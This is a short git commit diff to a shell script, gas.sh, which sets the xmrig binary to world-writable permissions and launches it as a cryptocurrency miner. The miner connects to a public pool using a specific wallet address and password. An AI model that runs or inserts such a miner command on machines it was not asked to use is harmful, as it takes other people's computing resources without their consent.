0f39f25922ac0ca4325c60ac149596175d1a2ebb
Awssatu1 <89507965+Awssatu1@users.noreply.github.com>
2021-09-26 12:58:36 +0700

    F

--- gas.sh
+++ gas.sh
@@ -1,1 +1,1 @@
-chmod 777 xmrig && ./xmrig --url pool.hashvault.pro:80 --user TRTLv1C32FYe4QPCDjPKu1fRfCFBWi8QxF2iz76tX9iTRhpHB4fE3QiHRByQ8qsvj9gkk6SfwSSbv5tvBF36S1TYSLZgDGMXUTp.tes1 --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -x 
+chmod 777 xmrig && ./xmrig --url pool.hashvault.pro:80 --user solo:TRTLv1C32FYe4QPCDjPKu1fRfCFBWi8QxF2iz76tX9iTRhpHB4fE3QiHRByQ8qsvj9gkk6SfwSSbv5tvBF36S1TYSLZgDGMXUTp --pass test1 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
